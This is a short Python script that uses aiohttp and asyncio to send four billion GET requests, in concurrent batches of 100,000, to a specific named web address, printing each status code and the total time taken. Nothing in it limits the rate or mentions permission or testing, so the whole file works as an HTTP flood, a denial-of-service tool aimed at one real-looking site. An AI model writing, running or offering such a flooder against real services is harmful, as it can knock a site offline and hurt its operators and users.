import aiohttp
import asyncio
import time

url = "https://app.coa.build/"
num_requests = 1000000 * 4000  # Total number of requests to send
batch_size = 100000   # Number of requests to send in each batch

async def send_request(session):
    try:
        async with session.get(url) as response:
            print(f"Response Status Code: {response.status}")
    except Exception as e:
        print(f"An error occurred: {e}")

async def send_requests(batch_size):
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session) for _ in range(batch_size)]
        await asyncio.gather(*tasks)

async def main():
    total_batches = num_requests // batch_size
    for _ in range(total_batches):
        await send_requests(batch_size)

if __name__ == "__main__":
    start_time = time.time()
    asyncio.run(main())
    elapsed_time = time.time() - start_time
    print(f"Total time taken: {elapsed_time} seconds")
